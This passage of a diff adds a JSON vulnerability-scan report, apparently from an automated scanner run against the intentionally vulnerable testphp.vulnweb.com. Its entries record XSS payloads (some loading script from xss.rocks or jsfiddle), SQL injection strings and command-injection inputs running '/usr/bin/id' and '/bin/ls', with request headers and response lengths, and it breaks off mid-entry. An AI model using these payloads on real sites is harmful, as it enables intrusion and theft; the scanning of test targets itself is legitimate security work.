+      "parameter": "cat",
+      "payload": "<SCRIPT a=`>` SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2193
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:04",
+        "unix_timestamp": 1770477844
+      }
+    },
+    {
+      "id": 35,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<SCRIPT a=\">\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2193
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:04",
+        "unix_timestamp": 1770477844
+      }
+    },
+    {
+      "id": 36,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"xss.rocks/xss.js\"></SCRIPT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2216
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:04",
+        "unix_timestamp": 1770477844
+      }
+    },
+    {
+      "id": 37,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<img src ?itworksonchrome?\\/onerror = alert(1)???",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2189
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:05",
+        "unix_timestamp": 1770477845
+      }
+    },
+    {
+      "id": 38,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2186
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:05",
+        "unix_timestamp": 1770477845
+      }
+    },
+    {
+      "id": 39,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<img src=\"javascript:alert('XSS')\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2175
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:05",
+        "unix_timestamp": 1770477845
+      }
+    },
+    {
+      "id": 40,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<img src=`xx:xx`onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2173
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:06",
+        "unix_timestamp": 1770477846
+      }
+    },
+    {
+      "id": 41,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<!--#exec cmd=\"/usr/bin/id\"-->",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2170
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:12",
+        "unix_timestamp": 1770477852
+      }
+    },
+    {
+      "id": 42,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2228
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:43",
+        "unix_timestamp": 1770477883
+      }
+    },
+    {
+      "id": 43,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2182
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:44",
+        "unix_timestamp": 1770477884
+      }
+    },
+    {
+      "id": 44,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2178
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:44",
+        "unix_timestamp": 1770477884
+      }
+    },
+    {
+      "id": 45,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2183
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:44",
+        "unix_timestamp": 1770477884
+      }
+    },
+    {
+      "id": 46,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2199
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:45",
+        "unix_timestamp": 1770477885
+      }
+    },
+    {
+      "id": 47,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2194
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:45",
+        "unix_timestamp": 1770477885
+      }
+    },
+    {
+      "id": 48,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2181
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:46",
+        "unix_timestamp": 1770477886
+      }
+    },
+    {
+      "id": 49,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "1' AND '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2185
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:47",
+        "unix_timestamp": 1770477887
+      }
+    },
+    {
+      "id": 50,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "1' AND SLEEP(5)--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2189
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:47",
+        "unix_timestamp": 1770477887
+      }
+    },
+    {
+      "id": 51,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2184
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:47",
+        "unix_timestamp": 1770477887
+      }
+    },
+    {
+      "id": 52,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "1' ORDER BY 1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2187
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:48",
+        "unix_timestamp": 1770477888
+      }
+    },
+    {
+      "id": 53,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "1' ORDER BY 10--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2188
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:48",
+        "unix_timestamp": 1770477888
+      }
+    },
+    {
+      "id": 54,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "admin'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2176
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:49",
+        "unix_timestamp": 1770477889
+      }
+    },
+    {
+      "id": 55,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<input type=\"text\" value=``<div/onmouseover='alert(1)'>X</div>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2236
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:50",
+        "unix_timestamp": 1770477890
+      }
+    },
+    {
+      "id": 56,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2223
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:50",
+        "unix_timestamp": 1770477890
+      }
+    },
+    {
+      "id": 57,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>?",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2241
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:51",
+        "unix_timestamp": 1770477891
+      }
+    },
+    {
+      "id": 58,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<input value=<><iframe/src=javascript:confirm(1)",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2222
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:51",
+        "unix_timestamp": 1770477891
+      }
+    },
+    {
+      "id": 59,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2248
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:52",
+        "unix_timestamp": 1770477892
+      }
+    },
+    {
+      "id": 60,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2250
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:53",
+        "unix_timestamp": 1770477893
+      }
+    },
+    {
+      "id": 61,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2229
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:53",
+        "unix_timestamp": 1770477893
+      }
+    },
+    {
+      "id": 62,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "%0A/usr/bin/id",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2187
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:53",
+        "unix_timestamp": 1770477893
+      }
+    },
+    {
+      "id": 63,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "%0A/usr/bin/id%0A",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2190
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:54",
+        "unix_timestamp": 1770477894
+      }
+    },
+    {
+      "id": 64,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": ";|/usr/bin/id|",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2187
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:58",
+        "unix_timestamp": 1770477898
+      }
+    },
+    {
+      "id": 65,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "\\n/bin/ls -al\\n",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2188
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:58",
+        "unix_timestamp": 1770477898
+      }
+    },
+    {
+      "id": 66,
+      "vulnerability_type": "RCE",
+      "endpoint": "http://testphp.vulnweb.com/artists.php",
+      "parameter": "artist",
+      "payload": "\\n/usr/bin/id;",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "artist"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2186
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
